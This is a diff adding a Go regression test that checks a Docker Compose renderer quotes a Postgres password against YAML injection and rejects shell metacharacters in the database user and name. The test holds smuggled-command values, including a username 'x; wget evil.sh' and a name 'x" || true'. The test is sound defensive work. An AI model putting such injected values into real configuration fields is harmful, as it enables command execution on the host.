@@ -231,6 +231,51 @@ func TestRenderComposePostgres(t *testing.T) {
 	}
 }
 
+// TestRenderComposeQuotesCredentials is the SEC-4 regression: operator-seeded
+// values (headless --answers) must not be able to inject YAML structure via the
+// environment block, and shell metacharacters in the CMD-SHELL-bound pg_user /
+// pg_name must be rejected outright.
+func TestRenderComposeQuotesCredentials(t *testing.T) {
+	d := NewDraft()
+	d.RuntimePath = RuntimeDocker
+	d.DBBackend = BackendPostgres
+	// A password full of YAML metacharacters must render as an inert quoted scalar.
+	d.PGPassword = `x: y` + "\n" + `evil: {a: b}#"'`
+	cfg := composeConfigFor("/home/u/.jentic")
+
+	data, err := RenderCompose(d, cfg)
+	if err != nil {
+		t.Fatalf("RenderCompose: %v", err)
+	}
+	assertValidComposeYAML(t, data)
+	var doc struct {
+		Services map[string]struct {
+			Environment map[string]string `yaml:"environment"`
+		} `yaml:"services"`
+	}
+	if err := yaml.Unmarshal(data, &doc); err != nil {
+		t.Fatalf("parse rendered compose: %v", err)
+	}
+	if got := doc.Services[composeServiceDB].Environment["POSTGRES_PASSWORD"]; got != d.PGPassword {
+		t.Errorf("password did not round-trip through YAML quoting: got %q want %q", got, d.PGPassword)
+	}
+	if _, injected := doc.Services[composeServiceDB].Environment["evil"]; injected {
+		t.Error("password value injected a new YAML key into the environment block")
+	}
+
+	// Shell metacharacters in the healthcheck-bound identifiers: rejected, not rendered.
+	d.PGPassword = "safe-pw"
+	d.PGUser = "x; wget evil.sh"
+	if _, err := RenderCompose(d, cfg); err == nil {
+		t.Error("expected RenderCompose to reject a pg_user with shell metacharacters")
+	}
+	d.PGUser = "jentic"
+	d.PGName = `x" || true`
+	if _, err := RenderCompose(d, cfg); err == nil {
+		t.Error("expected RenderCompose to reject a pg_name with shell metacharacters")
+	}
+}
+
 // The managed Postgres is reachable over the compose network; publishing 5432
 // on the host is opt-in (#992: it was published by default, guarded only by a
 // guessable password).
